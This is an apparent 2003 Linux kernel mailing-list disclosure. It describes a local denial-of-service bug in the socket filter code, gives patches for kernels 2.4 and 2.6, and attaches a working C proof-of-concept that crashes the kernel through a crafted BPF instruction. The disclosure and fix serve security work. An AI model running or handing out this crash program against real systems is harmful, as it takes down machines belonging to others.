From: Patrick McHardy <kaber@trash.net>
Subject: Local dos in linux socket filters
Date: Fri, 25 Jul 2003 20:20:22 +0200
Sender: linux-net-owner@vger.kernel.org
Message-ID: <3F2174E6.7060700@trash.net>
Mime-Version: 1.0
Content-Type: multipart/mixed;
 boundary="------------030305030001080202030804"
Return-path: <linux-net-owner@vger.kernel.org>
To: netdev@oss.sgi.com, linux-net@vger.kernel.org
List-Id: netdev.vger.kernel.org

This is a multi-part message in MIME format.
--------------030305030001080202030804
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Dave Miller asked me to post this so it is public:

The Linux Socket Filter implementation contains a bug which
can lead to a local dos. Due to a unsigned->signed conversion
and insufficient bounds checking it is possible to crash the kernel
by accessing unmapped memory. The bug was introduced
during the attempt to fix other signedness issues in 2.4.3-pre3.

The attached two patches for 2.4 and 2.6 fix the problem (already
in davem's tree). Also attached is a program to crash your kernel.

Bye,
Patrick

--------------030305030001080202030804
Content-Type: text/plain;
 name="linux-2.4-sock_filter-dos.diff"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="linux-2.4-sock_filter-dos.diff"

===== filter.c 1.3 vs edited =====
--- 1.3/net/core/filter.c	Tue Feb  5 08:40:16 2002
+++ edited/filter.c	Fri Jul 25 02:16:30 2003
@@ -294,10 +294,9 @@
 				goto load_b;
 
 			case BPF_LDX|BPF_B|BPF_MSH:
-				k = fentry->k;
-				if(k >= 0 && (unsigned int)k >= len)
+				if(fentry->k >= len)
 					return (0);
-				X = (data[k] & 0xf) << 2;
+				X = (data[fentry->k] & 0xf) << 2;
 				continue;
 
 			case BPF_LD|BPF_IMM:

--------------030305030001080202030804
Content-Type: text/plain;
 name="linux-2.6-sock_filter-dos.diff"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="linux-2.6-sock_filter-dos.diff"

===== net/core/filter.c 1.6 vs edited =====
--- 1.6/net/core/filter.c	Thu Jun  5 02:57:08 2003
+++ edited/net/core/filter.c	Fri Jul 25 02:35:07 2003
@@ -256,10 +256,9 @@
 			k = X + fentry->k;
 			goto load_b;
 		case BPF_LDX|BPF_B|BPF_MSH:
-			k = fentry->k;
-			if (k >= 0 && (unsigned int)k >= len)
+			if (fentry->k >= len)
 				return 0;
-			X = (data[k] & 0xf) << 2;
+			X = (data[fentry->k] & 0xf) << 2;
 			continue;
 		case BPF_LD|BPF_IMM:
 			A = fentry->k;

--------------030305030001080202030804
Content-Type: text/x-csrc;
 name="socketfilter.c"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="socketfilter.c"

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/bpf.h>
#include <errno.h>

int main(int argc, char **argv)
{
	struct sockaddr_in sin;
	struct bpf_program bp;
	struct bpf_insn buf[10];
	char rcvbuf[2000];
	int i = 0;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (fd < 0) {
		perror("socket");
		exit(1);
	}

	memset(buf, 0, sizeof(buf));

	buf[i].code = BPF_LDX|BPF_B|BPF_MSH;
	buf[i].k    = (1<<31) + (1<<29);
	i++;
	
	buf[i].code = BPF_RET;
	i++;

	bp.bf_len = i;
	bp.bf_insns = buf;

	if (setsockopt(fd, SOL_SOCKET, SO_ATTACH_FILTER, &bp, sizeof(bp)) < 0) {
		perror("setsockopt");
		exit(1);
	}

	sin.sin_family      = AF_INET;
	sin.sin_addr.s_addr = INADDR_ANY;
	sin.sin_port        = htons(10000);

	if (bind(fd, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
		perror("bind");
		exit(1);
	}

	if (recvfrom(fd, rcvbuf, sizeof(rcvbuf), 0, NULL, 0) < 0) {
		perror("recvfrom");
		exit(1);
	}
}

--------------030305030001080202030804--

